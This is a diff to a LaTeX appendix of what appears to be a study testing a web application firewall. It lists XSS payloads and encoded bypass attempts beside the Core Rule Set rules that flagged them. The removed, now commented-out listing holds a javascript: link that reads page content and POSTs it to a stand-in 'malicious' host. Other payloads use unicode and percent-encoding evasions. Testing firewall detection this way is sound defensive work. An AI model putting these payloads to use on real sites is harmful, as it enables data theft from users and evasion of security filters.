@@ -1,9 +1,48 @@
 \section{Attachments}
-some attachment...
+
+% \begin{lstlisting}[style=basicStyle, caption=original payloads, label=lst:originalpayloads]
+% XSS payloads:
+% alert("XSS")
+%
+% <a href="javascript:var secret = document.getElementsByName('name')[0].innerHTML;var data = {body:secret,method:'POST'};fetch('http:\//malicious:3001/api/sendsecret',data)">ClickMeFor$</a>
+% \end{lstlisting}
 
 
-\begin{lstlisting}[style=basicStyle, caption=original payloads, label=lst:originalpayloads]
-XSS payloads:
-alert("XSS")
-<a href="javascript:var secret = document.getElementsByName('name')[0].innerHTML;var data = {body:secret,method:'POST'};fetch('http:\//malicious:3001/api/sendsecret', data)">ClickMeFor$</a>
+\begin{lstlisting}[style=ruleStyle, language=XML, caption=unicode tests \$\{`alert`\}, label={lst:jsonunicodetests}]
+<payload>${`alert`}</payload>
+<message>"Remote Command Execution: Unix Shell Expression Found"</message>
+<file>"/rules/REQUEST-932-APPLICATION-ATTACK-RCE.conf"</file>
+<fileDetails>[line "291"] [id "932130"]<fileDetails>
+<MatchedData>"${`alert`}"</MatchedData>
+
+<payload>\u0024{alert`}</payload>
+<message>"Possible Unicode character bypass detected"</message>
+<file>"/rules/REQUEST-920-PROTOCOL-ENFORCEMENT.conf"</file>
+<fileDetails>[line "1263"] [id "920540"]<fileDetails>
+<MatchedData>"x5cu0024"</MatchedData>
+\end{lstlisting}
+
+
+\begin{lstlisting}[style=ruleStyle, language=XML, caption=url encoded example blocked, label={lst:urlencodedexampleblocked}]
+<payload>alert(`${new Date()}`)</payload>
+<payload>alert%28%60%24%7Bnew+Date%28%29%7D%60%29</payload>
+<message>"Remote Command Execution: Unix Shell Expression Found"</message>
+<file>"/rules/REQUEST-932-APPLICATION-ATTACK-RCE.conf"</file>
+<fileDetails>[line "291"] [id "932130"]<fileDetails>
+<MatchedData>"${new date()}"</MatchedData>
+
+<message>"Javascript method detected"</message>
+<file>"/rules/REQUEST-941-APPLICATION-ATTACK-XSS.conf"</file>
+<fileDetails>[line "714"] [id "941390"]<fileDetails>
+<MatchedData>"alert("</MatchedData>
+\end{lstlisting}
+
+
+\begin{lstlisting}[style=ruleStyle, language=XML, caption=unicode escape in json with additional percent encoding, label={lst:jsonunicodeurlenctest}]
+<payload>urllib.parse.quote_plus('{ "body": "alert\\u0024{1}" }')</payload>
+<payload>%7B+%22body%22%3A+%22alert%5Cu0024%7B1%7D%22+%7D</payload>
+<message>"Possible Unicode character bypass detected"</message>
+<file>"/rules/REQUEST-920-PROTOCOL-ENFORCEMENT.conf"</file>
+<fileDetails>[line "1263"] [id "920540"]<fileDetails>
+<MatchedData>"x5cu0024"</MatchedData>
 \end{lstlisting}
